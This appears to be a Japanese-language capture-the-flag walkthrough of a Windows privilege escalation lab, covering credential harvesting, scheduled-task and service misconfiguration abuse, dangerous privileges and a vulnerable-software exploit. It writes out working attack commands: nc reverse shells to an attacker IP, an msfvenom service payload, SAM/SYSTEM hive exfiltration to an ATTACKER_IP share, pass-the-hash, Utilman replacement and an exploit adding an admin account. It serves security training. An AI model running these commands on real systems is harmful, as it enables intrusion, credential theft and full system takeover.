# Windows Privilege Escalation

## Task2 Windows Privilege Escalation

### Windowsユーザ

| Built-in アカウント     | 説明     |
| --- | --- |
| SYSTEM/LocalSYstem    | オペレーティングシステムが内部タスクを実行するために使用するアカウント。管理者よりも高い権限で、ホスト上で利用可能なすべてのファイルとリソースに完全にアクセスできる。   |
| Local Service    | 「最小限の」権限でWindowsサービスを実行するために使用されるデフォルトのアカウント。ネットワーク経由で匿名接続を使用する。    |
| Network Service    | 「最小限の」県g年でWindowsサービスを事項するために使用されるデフォルトのアカウント。コンピューターの資格情報を使用して、ネットワーク経由で認証する。    |

## Task3 Harvesting Passwords from Usual Spots

パスワード情報が残っているかもしれない場所。

### 無人インストールで使用されるファイル

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unatend\Unattend.xml
- C:\Windows\System32\sysprep.inf
- C:\Windows\System32\sysprep\sysprep.xml

これらのファイルの一部として、資格情報が表示される場合がある。

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershellの履歴

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Windows資格情報

```cmd
cmdkey /list                         # 保存された資格情報を一覧表示
runas /savecred /user:admin cmd.exe  # ユーザーを指定してcmd.exeを実行
```

### IISのコンフィグ

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### PuttyなどのSSHクライアントの認証資格情報

```cmd
# Putty プロキシクレデンシャル情報
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Session\ /f "Proxy" /s
```

### タスク3の質問と解答

1. 上記「Powershellの履歴」に記載のコマンドで確認。
2. 上記「IISのコンフィグ」に記載のコマンドで確認。
3. 上記「Windows資格情報」に記載のコマンドを、/user:mike.katzに変えて実行。mike.katzのデスクトップにある flag.txtを確認。
4. 上記「Puttyプロキシクレデンシャル情報」に記載のコマンドで確認。

## Task4 Other Quick Wins

### タスクスケジューラを確認

```cmd
schtasks /query /tn task_name /fo list /v
```

### タスク4の質問と解答

1. 以下のとおり確認。

- ターゲットマシン側。
  
```cmd
schtasks /query /tn vulntask
echo c:\tools\nc64.exe -e cmd.exe x.x.x.x 4444 > c:\tasks\schtask.bat
# 攻撃マシン側のnc起動後
schtasks /run /tn vulntask
```

- 攻撃マシン側。

```shell
nc -lnvp 4444

#ターゲットマシンのシェル(cmd.exe)が起動される
c:\Windows\system32>
c:\Windows\system32> type C:\Users\taskusr1\Desktop\flag.txt
```

## Task5 Abusing Service Misconfigurations

サービスの設定ミスの悪用。

### Windowsサービス

- サービスの確認方法。

```cmd
sc qc <service_name>
```

| sc qc の出力結果の見方     | 説明     |
| --- | --- |
| BINARY_PATH_NAME    | 関連する実行可能ファイル     |
| SERVIE＿START_NAME    | サービス実行に使用されるアカウント     |

- サービス構成の保存場所（レジストリ）。

```cmd
HKLM\SYSTEM\CurrentContorolSet\Services\
```

- サービスの随意アクセス制御リスト（DACL）の確認方法。  
  [Process Hacker](https://processhacker.sourceforge.io/) で確認できる。

### 安全でないWindwosサービス

- サービスに関連付けられた実行可能ファイルのアクセス権が不適切。  
　icaclsでアクセス権を確認するとEveryoneに対して変更権限(M)があるなど。  
- 引用符で囲まれていないサービスパス。  
  サービスパスに空白を含む場合、プログラムと引数の区切りが曖昧になる。  
  例）C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exeの場合、以下の順で処理を試みる。

| コマンド     | 引数1     | 引数2     |
| --- | --- | --- |
| C:\MyProgram\Disk.exe | Sorter| Enterprise/bin/disksrs.exe|
| C:\MyProgram\Disk Sorter.exe| Enterprise/bin/disksrs.exe ||
| C:\MyProgram\Disk Sorter Enterprise\bin\disksrs.exe|| |

- サービスDACL（サービスの実行可能DACLではない）でサービスの構成を変更できる場合。  
  サービスDACLの確認には、SysinternalsのAccesschkを使用できる。

### タスク5の質問と解答

1. 以下のとおり確認。
  
- ターゲットマシンで実行。

```cmd
sc query WindowsScheduler    # BINARY_PATH_NAMEのプログラムを確認。
icacls c:\Program Files (x86)\SystemScheduler\WService.exe  # Everyoneに変更権限(M)がある

# 攻撃マシン側でペイロードを作成しダウンロードできる状態にしてから次の行を実施
powershell
PS> wget http://10.x.x.x:8000/rev-svc.exe -O rev-svc.exe
PS> exit

# ダウンロードした実行可能ファイルを、サービスプログラムに上書きする
move rev-svc.exe c:\Program Files (x86)\SystemScheduler\WService.exe

# 攻撃マシンのncで待け状態にしてからサービスを再起動
sc stop WindowsScheduler
sc start WindowsSchedulert
```

- 攻撃側マシンで実行。

```shell
#ペイロード作成
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.x.x.x LPORT=4445 -f exe-service -o rev-svc.exe

# ターゲットマシン側からダウンロードできるようにHTTPサーバを起動
$ python -m http.server

# ncで待ち受ける
$ nc -lvnp 4445
c:\Windows\System32>    # ターゲットマシンでサービスが再起動されると表示される
```

2. 以下のとおり確認。
   
- ターゲットマシンで実行。

```cmd
sc qc "disk sorter enterprise"   # BINARY_PATH_NAMEのプログラムを確認。
# C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe となっており引用符で囲まれてない

# ペイロードの名前をDisk.exeに変更し、C:\MyProgram配下に格納
# ペイロードは質問1で作成したものを使用。
move C:\Users\thm-unpriv\rev-svc.exe C:\MyPrograms\Disk.exe

# 攻撃側マシンで ncで待受け状態にしてからサービス再起動
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

- 攻撃側マシンで実行。

```shell
# ペイロード作成とターゲットマシンへのファイルダウンロードは質問1と同じ手順
# ncで待ち受ける
$ nc -lvnp 4445
c:\Windows\System32>    # ターゲットマシンでサービスが再起動されると表示される
```

3. 以下のとおり確認。

- ターゲットマシンで実行。

```cmd
accesschk64.exe -qlc thmservice
～(省略)～
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS                 
        # ↑ BUILTIN\Usersに SERVICE_ALL_ACCESS権限がある

# ペイロードの実行アクセス権を変更しておく
# ペイロードは質問1で作成したものを使用
icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F

# thmserviceに関連付ける実行可能ファイルとアカウントを変更する
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem

# 攻撃側マシンの ncを待受け状態にしてからサービス再起動
sc stop THMService
sc start THMService
```

- 攻撃側マシンで実行。

```shell
# ペイロード作成とターゲットマシンへのファイルダウンロードは質問1と同じ手順
# ncで待ち受ける
$ nc -lvnp 4445
c:\Windows\System32>    # ターゲットマシンでサービスが再起動されると表示される
```

## Task6 Abusing dangerous privileges

危険な特権の悪用。

### Windows権限

#### 各ユーザに割当てられている権限の確認  

Windowsシステムで利用可能な権限の完全なリストは[こちら](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)。  
悪用狩野な権限の包括的なリストは[Priv2Admin](https://github.com/gtworek/Priv2Admin)で見つかる。

```cmd
whoami /priv
```

### SeBackup / SeRestoreの権限を利用

SeBackupおよびSeRestore権限によりユーザーはシステム内の任意のファイルの読み取り、書き込みができる。

- ターゲットマシンで実行。

```cmd
# 管理者としてコマンドプロンプトを開く
# SeBackupやSeRestoreの権限があるか確認する
whoami /priv

# SAMおよびSYSTEMハッシュをバックアップする
reg save hkml\system C:\Users\THMBackup\system.hive
reg save hkml\sam C:\Users\THMBackup\sam.hive

# この後攻撃マシンでSMB共有を起動してから実施
# ハッシュファイルを攻撃マシンにコピー
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

- 攻撃マシンで実行。

```shell
# impacket の smbser.pyを利用してSMB共有を起動
$ mkdir share
$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

# impacketでユーザーのパスワードハッシュを取得
$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL

# impacketで管理者のハッシュを使用しPass-the-Hash攻撃を実行し、SYSTEM権限でターゲットマシンにアクセス
$ python3.9 /opt/impacket/examples/psexec.py -hashes
```

### SeTakeOwnershipの権限を利用

SeTakeOwnership権限により、ユーザーはファイルやレジストリキーなど、システム上の任意のオブジェクトの所有権を取得できる。  
以下の例ではutilmanを悪用して権限を昇格させる。utilmanはWindows設定の簡単操作を開くコマンド。

```cmd
# 管理者としてコマンドプロンプトを開く
# SeTakeOwnershipの権限があるか確認する
whoami /priv

# takeownコマンドでutilmanの所有権を取得する
takeown /f C:\Windows\System32\Utilman.exe

# icaclsでユーザーにフルコントロールのアクセス権を付与する
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F

# utilman.exe を cmd.exeに置き換える
cd C:\Windows\System32
copy cmd.exe utilman.exe

# Utilmanをトリガーするために、スタートボタンから画面をロックする
# ロック画面から、「簡単操作」のメニューを選択すると、置き換えられた cmd.exeがSYSTEM権限で起動する
```

### SeImpersonate / SeAssignPrimaryTokenの権限を利用

この権限により、プロセスは他のユーザーに成りすましてその代わりに行動することができる。
以下の例では、RogueWinRMのエクスプロイトを悪用して権限を昇格させる。

- 攻撃側マシンで実行

```shell
# ncでポートを待受けておく（以下の例では　4442ポート）
nc -lvnp 4442

# ブラウザを起動し、ターゲットマシンのIPへアクセス
# 接続画面のテキストボックスに以下のコマンドを入力し「Run」ボタンをクリック
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

### タスク6の質問と解答

1. タスク6の説明内に記載した3つの権限昇格方法のどれでも確認できる。  
   ※AtackBoxからターゲットマシンにRDP接続する場合は以下のコマンドを利用。

```shell
remmina -c rdp:<user_name>@target_ipaddress
```

## Task7 Abusing vulnerable software

脆弱なソフトウェアの悪用。

### パッチが適用されていないソフトウェア

- wmicを使用してインストールされたソフトウェアの情報を収集。  
  バージョン情報から、[Exploit-DB](https://www.exploit-db.com/)や[packet storm](https://packetstormsecurity.com/)、Googleなどで調べる。

```cmd
wmic product get name, version, vendor
```

### タスク7の質問と解答

1. 以下のとおり確認。

```cmd
# Druva inSync6.6.3がインストールされていることを確認
wmic product get name, version, vendor
～（省略）～
Druva inSync 6.6.3    Druva Technologies Pte. Ltd.             6.6.3.0
～（省略）～

# Exploitコードが C:\tools\Durva_inSync_exploit.txt にあるので $cmdの行を以下に編集
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

# ファイルの拡張子を変更
rename Durva_inSync_exploit.txt Durva_inSync_exploit.ps1

# Exploitコードを実行
powershell -NoProfile -ExecutionPolicy Unrestricted .\Druva_inSync_exploit.ps1

# ユーザーが作成されていることを確認
net user pwnd

# pwndユーザーでコマンドプロンプトを起動
runas /user:pwnd cmd.exe
Enter the password for pwnd:   # SimplePass123を入力
```

## Task8 Tools of the Trade

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
- [WES-NG](https://github.com/bitsadmin/wesng)　※リモートから実行できる
- Metasploitの multi/recon/local_exploit_suggester


## Task9 Conclusion

### 特権昇格について追加のテクニック

- [PayloadsAllTheThings - Windows 権限昇格](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Windows 特権の悪用](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM エクスプロイト](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows ローカル権限昇格](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
